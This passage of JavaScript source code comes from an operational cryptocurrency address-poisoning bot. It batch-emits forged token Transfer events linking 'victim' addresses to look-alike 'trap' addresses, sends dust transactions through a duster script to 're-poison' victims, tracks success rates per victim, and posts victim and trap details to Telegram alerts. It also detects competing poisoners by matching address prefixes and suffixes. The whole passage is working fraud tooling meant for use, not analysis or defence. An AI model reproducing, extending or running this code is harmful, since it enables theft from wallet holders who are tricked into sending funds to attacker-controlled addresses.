        await sendBatchFailureAlert([item], 'Transaction failed, was dropped, or RPC timed out. (Check operator wallet gas)', operatorAddress);
      }
      return;
    }

    const froms = groupItems.map(i => i.victimAddress);
    const tos = groupItems.map(i => i.trapAddress);
    const values = groupItems.map(i => i.rawValue);

    logger.info(`[batch] 🔥 Emitting single-token batch of ${groupItems.length} transfers via ${contractAddr.slice(0, 10)}...`);

    const hash = await emitBatchForgedTransfers(
      campaignWallet.walletClient,
      campaignId,
      contractAddr,
      froms,
      tos,
      values
    );

    if (hash) {
      logger.info(`[batch] ✅ Batch confirmed: ${groupItems.length} transfers in tx=${hash}`);
      await sendBatchAlert(groupItems, hash, contractAddr);
      updateBatchStats(groupItems, true);
    } else {
      logger.error(`[batch] ❌ Batch failed for ${groupItems.length} items`);
      updateBatchStats(groupItems, false);

      // 🚀 FIX: Removed hanging client.getBalance() RPC calls
      await sendBatchFailureAlert(groupItems, 'Batch transaction failed, was dropped, or RPC timed out. (Check operator wallet gas)', operatorAddress);
    }
    return;
  }

  // Multi-token batch
  logger.info(`[batch] 🔥 Emitting MULTI-TOKEN batch: ${contractGroups.size} different tokens, ${items.length} total transfers`);

  const hash = await emitMultiTokenBatch(
    campaignWallet.walletClient,
    campaignId,
    contractGroups
  );

  if (hash) {
    logger.info(`[batch] ✅ Multi-token batch confirmed: ${items.length} transfers across ${contractGroups.size} tokens in tx=${hash}`);
    await sendBatchAlert(items, hash, MULTI_TOKEN_ROUTER);
    updateBatchStats(items, true);
  } else {
    logger.error(`[batch] ❌ Multi-token batch failed for ${items.length} items`);
    updateBatchStats(items, false);

    // 🚀 FIX: Removed client.getBalance() and client.getGasPrice() from here!
    // Those RPC calls were hanging on bad nodes and blocking the notification from ever sending.
    // The exact gas error is already handled and sent directly inside emitMultiTokenBatch.
    await sendBatchFailureAlert(items, 'Transaction failed, was dropped, or RPC timed out. (Check operator wallet gas)', operatorAddress);
  }
}

async function emitBatchForgedTransfers(walletClient, campaignId, contractAddress, froms, tos, values) {
  if (!walletClient || !contractAddress) return false;

  if (!campaignMirrorLocks.has(campaignId)) {
    campaignMirrorLocks.set(campaignId, Promise.resolve());
  }

  const currentLock = campaignMirrorLocks.get(campaignId);
  const operatorAddress = walletClient.account.address;

  const run = currentLock.then(async () => {

    try {
      const [operatorBalance, gasPrice] = await Promise.all([
        client.getBalance({ address: operatorAddress }),
        client.getGasPrice(),
      ]);

      const estimatedGas = BigInt(60000 + (25000 * froms.length));
      const estimatedGasCost = estimatedGas * gasPrice;

      if (operatorBalance < estimatedGasCost) {
        const neededEth = Number(estimatedGasCost) / 1e18;
        const haveEth = Number(operatorBalance) / 1e18;
        const errorMsg = `Insufficient gas. Need ${neededEth.toFixed(6)} ${nativeSymbol}, have ${haveEth.toFixed(6)} ${nativeSymbol}`;
        logger.error(`[batch] Operator ${operatorAddress} ${errorMsg}`);

        // 🚀 SEND FAILURE ALERT DIRECTLY (WITH STRICT AWAIT & LOGGING)
        const msg = `❌ *Single-Token Batch FAILED*\n\n📦 Items: ${froms.length} transfers\n⚠️ Error: ${errorMsg}\n🔑 Operator: \`${operatorAddress}\`\n\n💡 Fund this wallet to resume batching.`;

        logger.info(`[batch] 🚨 Preparing to send failure alert to campaign ${campaignId}...`);
        try {
          await sendAlert(msg, 'warning', campaignId);
          logger.info(`[batch] ✅ Failure alert sent successfully!`);
        } catch (alertErr) {
          logger.error(`[batch] ❌ CRITICAL: sendAlert threw an error: ${alertErr.message}`);
        }

        return false;
      }
    } catch (checkErr) {
      logger.warn(`[batch] Pre-flight gas check failed: ${checkErr.message}`);
    }

    let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);

    // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
    let maxFeePerGas = 2000000000n; // 2 gwei default fallback
    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
    const TARGET_MAX_FEE_GWEI = 1.5; // The cheap rate we want
    const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
    const networkTip = 10000000n; // 0.01 gwei tip

    try {
      const block = await client.getBlock({ blockTag: 'latest' });
      let baseFee = block.baseFeePerGas || 0n;
      let finalMaxFee = baseFee + networkTip; // Default to current market rate

      if (baseFee <= targetMaxFee) {
        // Network is cheap right now, fire immediately!
        finalMaxFee = baseFee + networkTip;
        logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
      } else {
        // Network is expensive. Wait up to 10 minutes for it to drop.
        logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);

        let gasDropped = false;
        for (let i = 0; i < 50; i++) { // 50 blocks * 12 seconds = 10 minutes
          await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block

          try {
            const currentBlock = await client.getBlock({ blockTag: 'latest' });
            const currentBaseFee = currentBlock.baseFeePerGas || 0n;

            if (currentBaseFee <= targetMaxFee) {
              finalMaxFee = currentBaseFee + networkTip;
              gasDropped = true;
              logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
              break;
            }

            // Log every minute so you can watch it waiting
            if (i % 5 === 0) {
              logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
            }
          } catch (e) {
            logger.warn(`[gas-strategy] Failed to check base fee: ${e.message}`);
            break;
          }
        }

        if (!gasDropped) {
          // Gas didn't drop in 10 minutes. Fire at current market rate to prevent stuck nonces.
          try {
            const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
            const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
            finalMaxFee = fallbackBaseFee + networkTip;
            logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
          } catch (e) {
            finalMaxFee = baseFee + networkTip;
            logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
          }
        }
      }

      maxFeePerGas = finalMaxFee;
      maxPriorityFeePerGas = networkTip;

    } catch (e) {
      logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
    }

    // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
    if (maxPriorityFeePerGas >= maxFeePerGas) {
      maxPriorityFeePerGas = maxFeePerGas / 2n;
    }

    let lastError = null;
    let hash = null;

    // 🚀 ROTATION FIX: Manually rotate through RPC endpoints on rate limits
    const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
    const maxAttempts = Math.min(rpcUrls.length, 46);

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      try {
        const tempTransport = http(rpcUrls[attempt % rpcUrls.length], { timeout: 15000 });
        const tempWalletClient = createWalletClient({
          account: walletClient.account,
          chain: viemChain,
          transport: tempTransport,
        });

        hash = await tempWalletClient.writeContract({
          address: contractAddress,
          abi: MIRROR_TOKEN_ABI,
          functionName: 'batchEmitTransfers',
          args: [froms, tos, values],
          nonce: nonce,
          gas: BigInt(60000 + (25000 * froms.length)), // 🚀 Realistic gas limit for batch event emission
          maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
          maxPriorityFeePerGas: maxPriorityFeePerGas,
        });

        logger.info(`[batch] Successfully used RPC ${attempt + 1}/${maxAttempts}: ${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`);
        break;
      } catch (err) {
        lastError = err;
        const errMsg = err.message || String(err);
        const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);

        // 🚀 NONCE SYNC FIX: If the network rejects the nonce (too low OR too high), fetch a fresh one immediately
        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('higher than the') || errMsg.includes('replacement transaction') || errMsg.includes('nonce has already been used')) {

          logger.warn(`[batch] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
          try {
            const freshNonce = await client.getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
              .catch(() => client.getTransactionCount({ address: operatorAddress }));
            nonce = freshNonce;
            const nonces = campaignNonces.get(campaignId);
            if (nonces) nonces.set(operatorAddress, freshNonce);
          } catch (nonceErr) {
            logger.warn(`[batch] Failed to fetch fresh nonce: ${nonceErr.message}`);
          }
        }

        // 🚀 FIX: Rotate on ALMOST ALL errors because public RPCs have broken simulation engines.
        const isFatal =
          errMsg.includes('invalid private key') ||
          errMsg.includes('unknown account') ||
          errMsg.includes('missing revert data');

        if (isFatal) {
          throw err;
        }

        logger.warn(`[batch] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ${errMsg.slice(0, 60)}... rotating`);
        await new Promise(resolve => setTimeout(resolve, 1000));
        continue; // Try next RPC
      }
    }

    if (!hash && lastError) {
      throw lastError;
    }

    // 🚀 CRITICAL FIX: Wait for the transaction to be ACTUALLY MINED before moving on.
    let receiptSuccess = false;
    try {
      const receipt = await client.waitForTransactionReceipt({
        hash: hash,
        timeout: 90000, // 90 seconds max wait
        confirmations: 1,
      });
      logger.info(`[batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
      receiptSuccess = true;
    } catch (waitErr) {
      logger.warn(`[batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
    }

    if (receiptSuccess) {
      confirmNonceIncrement(campaignId, operatorAddress);
      logger.info(`[batch] Forged batch emitted via ${contractAddress.slice(0, 10)}...: ${froms.length} transfers, tx=${hash}`);
      return hash;
    } else {
      logger.warn(`[batch] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}... to prevent desync.`);
      const nonces = campaignNonces.get(campaignId);
      if (nonces) nonces.delete(operatorAddress);
      logger.error(`[batch] ❌ Batch timed out and was dropped by the network. tx=${hash}`);
      return false; // 🚀 FIX: Return false so it triggers the failure alert instead of a fake success!
    }
  }).catch(err => {
    const errMsg = err.message || String(err);

    const nonces = campaignNonces.get(campaignId);
    if (nonces && nonces.has(operatorAddress)) {
      nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
    }

    if (errMsg.toLowerCase().includes('insufficient funds') || errMsg.toLowerCase().includes('gas')) {
      logger.error(`[batch] Transaction failed due to gas: ${errMsg}`);
    } else if (errMsg.includes('rate-limit') || errMsg.includes('capacity')) {
      logger.error(`[batch] RPC rate limited: ${errMsg.slice(0, 80)}`);
    } else {
      logger.warn(`[batch] Failed to emit batch: ${errMsg}`);
    }
    return false;
  });

  campaignMirrorLocks.set(campaignId, run.then(() => { }));
  return run;
}


// ═══════════════════════════════════════════════════════════
// 🚀 MULTI-TOKEN BATCH: Emit multiple tokens in ONE transaction
// ═══════════════════════════════════════════════════════════
async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
  if (!walletClient || !MULTI_TOKEN_ROUTER) {
    logger.error('[multi-batch] Router not configured, falling back to sequential');
    return false;
  }

  if (!campaignMirrorLocks.has(campaignId)) {
    campaignMirrorLocks.set(campaignId, Promise.resolve());
  }

  const currentLock = campaignMirrorLocks.get(campaignId);
  const operatorAddress = walletClient.account.address;

  const run = currentLock.then(async () => {

    try {
      const [operatorBalance, gasPrice] = await Promise.all([
        client.getBalance({ address: operatorAddress }),
        client.getGasPrice(),
      ]);

      // Estimate gas: ~50k base + ~25k per transfer across all tokens
      let totalTransfers = 0;
      for (const [, items] of contractGroups) {
        totalTransfers += items.length;
      }
      const estimatedGas = BigInt(60000 + (25000 * totalTransfers));
      const estimatedGasCost = estimatedGas * gasPrice;

      if (operatorBalance < estimatedGasCost) {
        const neededEth = Number(estimatedGasCost) / 1e18;
        const haveEth = Number(operatorBalance) / 1e18;
        const errorMsg = `Insufficient gas. Need ${neededEth.toFixed(6)} ${nativeSymbol}, have ${haveEth.toFixed(6)} ${nativeSymbol}`;
        logger.error(`[multi-batch] Operator ${operatorAddress} ${errorMsg}`);

        // 🚀 SEND FAILURE ALERT DIRECTLY (WITH STRICT AWAIT & LOGGING)
        const msg = `❌ *Multi-Token Batch FAILED*\n\n📦 Items: ${totalTransfers} transfers\n⚠️ Error: ${errorMsg}\n🔑 Operator: \`${operatorAddress}\`\n\n💡 Fund this wallet to resume batching.`;

        logger.info(`[multi-batch] 🚨 Preparing to send failure alert to campaign ${campaignId}...`);
        try {
          await sendAlert(msg, 'warning', campaignId);
          logger.info(`[multi-batch] ✅ Failure alert sent successfully!`);
        } catch (alertErr) {
          logger.error(`[multi-batch] ❌ CRITICAL: sendAlert threw an error: ${alertErr.message}`);
        }

        return false;
      }
    } catch (checkErr) {
      logger.warn(`[multi-batch] Pre-flight gas check failed: ${checkErr.message}`);
    }

    let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);

    // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
    let maxFeePerGas = 2000000000n; // 2 gwei default fallback
    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
    const TARGET_MAX_FEE_GWEI = 1.5; // The cheap rate we want
    const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
    const networkTip = 10000000n; // 0.01 gwei tip

    try {
      const block = await client.getBlock({ blockTag: 'latest' });
      let baseFee = block.baseFeePerGas || 0n;
      let finalMaxFee = baseFee + networkTip; // Default to current market rate

      if (baseFee <= targetMaxFee) {
        // Network is cheap right now, fire immediately!
        finalMaxFee = baseFee + networkTip;
        logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
      } else {
        // Network is expensive. Wait up to 10 minutes for it to drop.
        logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);

        let gasDropped = false;
        for (let i = 0; i < 50; i++) { // 50 blocks * 12 seconds = 10 minutes
          await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block

          try {
            const currentBlock = await client.getBlock({ blockTag: 'latest' });
            const currentBaseFee = currentBlock.baseFeePerGas || 0n;

            if (currentBaseFee <= targetMaxFee) {
              finalMaxFee = currentBaseFee + networkTip;
              gasDropped = true;
              logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
              break;
            }

            // Log every minute so you can watch it waiting
            if (i % 5 === 0) {
              logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
            }
          } catch (e) {
            logger.warn(`[gas-strategy] Failed to check base fee: ${e.message}`);
            break;
          }
        }

        if (!gasDropped) {
          // Gas didn't drop in 10 minutes. Fire at current market rate to prevent stuck nonces.
          try {
            const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
            const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
            finalMaxFee = fallbackBaseFee + networkTip;
            logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
          } catch (e) {
            finalMaxFee = baseFee + networkTip;
            logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
          }
        }
      }

      maxFeePerGas = finalMaxFee;
      maxPriorityFeePerGas = networkTip;

    } catch (e) {
      logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
    }

    // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
    if (maxPriorityFeePerGas >= maxFeePerGas) {
      maxPriorityFeePerGas = maxFeePerGas / 2n;
    }

    // 🚀 Build the multi-token batch calls array
    const calls = [];
    let totalTransfers = 0;

    for (const [contractAddr, items] of contractGroups) {
      const froms = items.map(i => i.victimAddress);
      const tos = items.map(i => i.trapAddress);
      const values = items.map(i => i.rawValue);
      totalTransfers += items.length;

      calls.push({
        target: contractAddr,
        froms: froms,
        tos: tos,
        values: values,
      });
    }

    logger.info(`[multi-batch] Building batch with ${calls.length} contract calls, ${totalTransfers} total transfers`);

    let lastError = null;
    let hash = null;

    const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
    const maxAttempts = Math.min(rpcUrls.length, 46);

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      try {
        const tempTransport = http(rpcUrls[attempt % rpcUrls.length], { timeout: 15000 });
        const tempWalletClient = createWalletClient({
          account: walletClient.account,
          chain: viemChain,
          transport: tempTransport,
        });

        hash = await tempWalletClient.writeContract({
          address: MULTI_TOKEN_ROUTER,
          abi: MULTI_TOKEN_ROUTER_ABI,
          functionName: 'transfer',
          args: [calls],
          nonce: nonce,
          gas: BigInt(60000 + (25000 * totalTransfers)),
          maxFeePerGas: maxFeePerGas,
          maxPriorityFeePerGas: maxPriorityFeePerGas,
        });

        logger.info(`[multi-batch] Successfully used RPC ${attempt + 1}/${maxAttempts}: ${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`);
        break;
      } catch (err) {
        lastError = err;
        const errMsg = err.message || String(err);
        const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);

        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('higher than the') || errMsg.includes('replacement transaction') || errMsg.includes('nonce has already been used')) {
          logger.warn(`[multi-batch] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
          try {
            const freshNonce = await client.getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
              .catch(() => client.getTransactionCount({ address: operatorAddress }));
            nonce = freshNonce;
            const nonces = campaignNonces.get(campaignId);
            if (nonces) nonces.set(operatorAddress, freshNonce);
          } catch (nonceErr) {
            logger.warn(`[multi-batch] Failed to fetch fresh nonce: ${nonceErr.message}`);
          }
        }

        const isFatal =
          errMsg.includes('invalid private key') ||
          errMsg.includes('unknown account') ||
          errMsg.includes('missing revert data');

        if (isFatal) {
          throw err;
        }

        logger.warn(`[multi-batch] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ${errMsg.slice(0, 60)}... rotating`);
        await new Promise(resolve => setTimeout(resolve, 1000));
        continue;
      }
    }

    if (!hash && lastError) {
      throw lastError;
    }

    let receiptSuccess = false;
    try {
      const receipt = await client.waitForTransactionReceipt({
        hash: hash,
        timeout: 90000,
        confirmations: 1,
      });
      logger.info(`[multi-batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
      receiptSuccess = true;
    } catch (waitErr) {
      logger.warn(`[multi-batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
    }

    if (receiptSuccess) {
      confirmNonceIncrement(campaignId, operatorAddress);
      logger.info(`[multi-batch] Multi-token batch emitted: ${totalTransfers} transfers across ${calls.length} tokens, tx=${hash}`);
      return hash;
    } else {
      logger.warn(`[multi-batch] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}... to prevent desync.`);
      const nonces = campaignNonces.get(campaignId);
      if (nonces) nonces.delete(operatorAddress);
      logger.error(`[multi-batch] ❌ Batch timed out and was dropped by the network. tx=${hash}`);
      return false; // 🚀 FIX: Return false so it triggers the failure alert instead of a fake success!
    }
  }).catch(err => {
    const errMsg = err.message || String(err);

    const nonces = campaignNonces.get(campaignId);
    if (nonces && nonces.has(operatorAddress)) {
      nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
    }

    if (errMsg.toLowerCase().includes('insufficient funds') || errMsg.toLowerCase().includes('gas')) {
      logger.error(`[multi-batch] Transaction failed due to gas: ${errMsg}`);
    } else if (errMsg.includes('rate-limit') || errMsg.includes('capacity')) {
      logger.error(`[multi-batch] RPC rate limited: ${errMsg.slice(0, 80)}`);
    } else {
      logger.warn(`[multi-batch] Failed to emit multi-token batch: ${errMsg}`);
    }
    return false;
  });

  campaignMirrorLocks.set(campaignId, run.then(() => { }));
  return run;
}


// ─── Explorer URL Helper ───
function getExplorerUrl(address, type = 'address') {
  let baseUrl = 'https://etherscan.io';
  if (chainName === 'bsc') baseUrl = 'https://bscscan.com';
  else if (chainName === 'polygon') baseUrl = 'https://polygonscan.com';

  if (type === 'tx') return `${baseUrl}/tx/${address}`;
  return `${baseUrl}/address/${address}#tokentxns`;
}

async function sendBatchFailureAlert(items, errorReason, operatorAddress = null) {
  if (items.length === 0) return;

  const firstItem = items[0];
  const campaignId = firstItem.entry?.campaignId;

  const autoCount = items.filter(i => i.type === 'auto').length;
  const counterCount = items.filter(i => i.type === 'counter').length;

  let typeLabel = 'Batch';
  if (autoCount > 0 && counterCount === 0) typeLabel = 'Auto-Poison Batch';
  else if (counterCount > 0 && autoCount === 0) typeLabel = 'Counter-Poison Batch';
  else if (autoCount > 0 && counterCount > 0) typeLabel = `Mixed Batch (${autoCount} Auto / ${counterCount} Counter)`;

  let operatorInfo = '';
  if (operatorAddress) {
    operatorInfo = `\n🔑 Operator: \`${operatorAddress}\`\n`;
  }

  const msg =
    `❌ *${typeLabel} FAILED*\n\n` +
    `📦 Items: ${items.length} transfers\n` +
    `⚠️ Error: ${errorReason}${operatorInfo}\n` +
    `\n💡 These items were NOT sent and have been dropped from the queue.`;

  try {
    await sendAlert(msg, 'error', campaignId);
  } catch (err) {
    logger.warn(`[batch] Failed to send failure alert: ${err.message}`);
  }
}

async function sendBatchAlert(items, txHash, contractAddress) {
  if (items.length === 0) return;

  const firstItem = items[0];
  const campaignId = firstItem.entry?.campaignId;

  // 🚀 CHUNKING FIX: Split into groups of 10 to stay well under Telegram's 4096 char limit
  const CHUNK_SIZE = 10;
  const chunks = [];
  for (let i = 0; i < items.length; i += CHUNK_SIZE) {
    chunks.push(items.slice(i, i + CHUNK_SIZE));
  }

  const autoCount = items.filter(i => i.type === 'auto').length;
  const counterCount = items.filter(i => i.type === 'counter').length;
  const overriddenCount = items.filter(i => i.overridden).length;

  let typeLabel = 'Mirror Batch';
  if (autoCount > 0 && counterCount === 0) typeLabel = 'Auto-Poison Batch';
  else if (counterCount > 0 && autoCount === 0) typeLabel = 'Counter-Poison Batch';
  else if (autoCount > 0 && counterCount > 0) typeLabel = `Mixed Batch (${autoCount} Auto / ${counterCount} Counter)`;

  let overrideSummary = '';
  if (overriddenCount > 0) {
    overrideSummary = `\n⚠️ *${overriddenCount} Auto-Trigger(s) Overridden*`;
  }

  const txUrl = getExplorerUrl(txHash, 'tx');
  const contractUrl = getExplorerUrl(contractAddress);
  const totalChunks = chunks.length;

  // 🚀 Send a separate message for each chunk
  for (let chunkIdx = 0; chunkIdx < totalChunks; chunkIdx++) {
    const chunk = chunks[chunkIdx];
    const startIdx = chunkIdx * CHUNK_SIZE; // Continuous numbering across messages

    const lines = chunk.map((item, idx) => {
      const decimals = getDecimals(item.detectedAsset || 'ETH');
      const amountDisplay = (Number(item.rawValue) / (10 ** decimals)).toFixed(4);

      let icon = item.type === 'counter' ? '🏆' : '🪞';
      let overrideLabel = '';
      if (item.type === 'counter' && item.overridden) {
        overrideLabel = ' *(Auto Overridden)*';
      }

      const victimUrl = getExplorerUrl(item.victimAddress);
      const trapUrl = getExplorerUrl(item.trapAddress);

      return `${icon} *${startIdx + idx + 1}.* (${amountDisplay} ${item.detectedAsset || '?'})${overrideLabel}\n` +
        `👤 Victim: \`${item.victimAddress}\`\n🔗 ${victimUrl}\n` +
        `🪤 Trap: \`${item.trapAddress}\`\n🔗 ${trapUrl}`;
    });

    let header = `⚡ *${typeLabel}* — ${items.length} transfers in 1 TX!${overrideSummary}\n`;
    if (totalChunks > 1) {
      header += `📄 *Part ${chunkIdx + 1}/${totalChunks}*\n`;
    }
    header += '\n';

    const msg =
      header +
      lines.join('\n\n') +
      `\n\n📦 Contract: \`${contractAddress}\`\n🔗 ${contractUrl}\n` +
      `\n🔗 TX: ${txUrl}`;

    try {
      await sendAlert(msg, 'success', campaignId);
      // Small delay between chunks to prevent Telegram API rate limiting
      if (chunkIdx < totalChunks - 1) {
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (err) {
      logger.warn(`[batch] Failed to send batch alert chunk ${chunkIdx + 1}: ${err.message}`);
    }
  }
}

function updateBatchStats(items, success) {
  for (const item of items) {
    if (item.type === 'auto' && item.entry) {
      if (success) item.entry.lastPoison = Date.now();

      let stats = victimStats.get(item.victimAddress) || { attempts: 0, successes: 0, failures: 0 };
      stats.attempts++;
      if (success) stats.successes++;
      else stats.failures++;
      victimStats.set(item.victimAddress, stats);
    }
    if (item.type === 'counter' && item.entry) {
      if (success) item.entry.lastCounterPoison = Date.now();
    }
  }
}



// ─── Send dust via duster.py (accepts optional asset) ──
async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
  const dusterPath = path.resolve(__dirname, '../tools/duster.py');
  const pythonCmd = path.resolve(__dirname, '../venv/bin/python3');

  const env = { ...process.env, CHAIN: chainName };
  if (campaignId) env.CAMPAIGN_ID = campaignId;
  if (asset) env.DUST_ASSET = asset;

  const cmd = `${pythonCmd} ${dusterPath} ${privateKey} ${victimAddress}`;

  try {
    const { stdout, stderr } = await execAsync(cmd, { timeout: EXEC_TIMEOUT_MS, env });
    if (stderr) logger.warn(`duster stderr: ${stderr}`);
    logger.info(`duster stdout: ${stdout.trim()}`);

    const txHashMatch = stdout.match(/0x[a-fA-F0-9]{64}/);
    return txHashMatch ? txHashMatch[0] : true;
  } catch (error) {
    if (error.killed && error.signal === 'SIGTERM') {
      logger.error(`duster timed out after ${EXEC_TIMEOUT_MS}ms`);
    } else {
      logger.error(`duster error: ${error.message}`);
      if (error.stdout) logger.info(`duster stdout (failed): ${error.stdout.trim()}`);
      if (error.stderr) logger.warn(`duster stderr (failed): ${error.stderr.trim()}`);
    }
    return false;
  }
}

// --- Poison a victim (accepts asset) ---
async function poisonVictim(victimAddress, privateKey, campaignId, asset = null) {
  logger.info(`Re‑poisoning victim ${victimAddress}...`);
  let successCount = 0;
  let txHash = null;

  for (let i = 0; i < DUST_RETRIES; i++) {
    const result = await sendDust(privateKey, victimAddress, campaignId, asset);
    if (result) {
      successCount++;
      if (typeof result === 'string' && result.startsWith('0x')) {
        txHash = result;
      }
      break;
    }
    if (i < DUST_RETRIES - 1) {
      await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_DUST_MS));
    }
  }

  const victimUrl = getExplorerUrl(victimAddress);
  const txUrl = txHash ? getExplorerUrl(txHash, 'tx') : '';
  const statusMsg = successCount > 0 ? 'Re‑poison complete' : 'Re‑poison failed';

  const msg = `♻️ *${statusMsg}*\n\n` +
    `👤 Victim: \`${victimAddress}\`\n🔗 ${victimUrl}\n` +
    `📊 Sent: ${successCount}/${DUST_RETRIES} dust tx` +
    (txUrl ? `\n\n🔗 TX: ${txUrl}` : '');

  logger.info(`Re-poison ${statusMsg}: ${successCount}/${DUST_RETRIES} to ${victimAddress}`);

  if (successCount > 0) {
    try {
      await sendAlert(msg, 'info', campaignId);
    } catch (err) {
      logger.warn(`Failed to send re-poison summary alert: ${err.message}`);
    }
  }

  const entry = victims.get(victimAddress);
  if (entry) entry.lastPoison = Date.now();

  let stats = victimStats.get(victimAddress) || { attempts: 0, successes: 0, failures: 0 };
  stats.attempts++;
  if (successCount > 0) stats.successes++;
  else stats.failures++;
  victimStats.set(victimAddress, stats);

  const totalAttempts = Array.from(victimStats.values()).reduce((sum, s) => sum + s.attempts, 0);
  const now = Date.now();
  if (totalAttempts % 10 === 0 || now - lastStatsLogTime > STATS_LOG_INTERVAL_MS) {
    let summary = `📊 Re‑poison stats (total attempts: ${totalAttempts}):\n`;
    for (const [addr, s] of victimStats) {
      summary += `  ${addr}: ${s.successes} success, ${s.failures} fail (${s.attempts} attempts)\n`;
    }
    logger.info(summary);
    lastStatsLogTime = now;
  }
}


// --- Check a single transaction ---
function checkTransaction(tx, txLogs = []) {
  if (!tx || !tx.from || !tx.to || !tx.hash) return;

  const from = tx.from.toLowerCase();
  const to = tx.to.toLowerCase();
  const hash = tx.hash;
  const now = Date.now();


  // 🆕 DIAGNOSTIC: Log when we see a transaction from one of our victims
  if (victims.has(from)) {
    const entry = victims.get(from);
    logger.info(`[DEBUG] 👀 Victim transaction detected: ${from} → ${to} (counterparty: ${entry.counterparty})`);
  }


  // Deduplicate
  if (processedTxHashes.has(hash)) {
    logger.debug(`[DEBUG] Transaction ${hash} already processed, skipping`);
    return;
  }
  processedTxHashes.set(hash, now);

  if (processedTxHashes.size > 50000) {
    processedTxHashes.clear();
    logger.debug('Cleared processedTxHashes map to prevent memory bloat');
  }

  // 🚀 SCALE FIX: O(1) Map lookups instead of looping through 100,000 victims
  const ourMirrorContracts = new Set(
    Object.values(MIRROR_CONTRACTS).filter(Boolean).map(addr => addr.toLowerCase())
  );

  // Helper to check if an address matches the counterparty pattern
  function isCompetitorLog(suspectAddress, entry) {
    if (!entry?.counterparty) return false;
    if (suspectAddress === entry.trapAddress || suspectAddress === entry.counterparty) return false;

    const prefix = entry.counterparty.slice(2, 6);
    const suffix = entry.counterparty.slice(-4);
    const suspectWithout0x = suspectAddress.slice(2);

    return suspectWithout0x.slice(0, 4) === prefix && suspectWithout0x.slice(-4) === suffix;
  }

  // 🚀 Calculate asset and amount EARLY
  const earlyDetectedAsset = getAssetFromTx(tx);
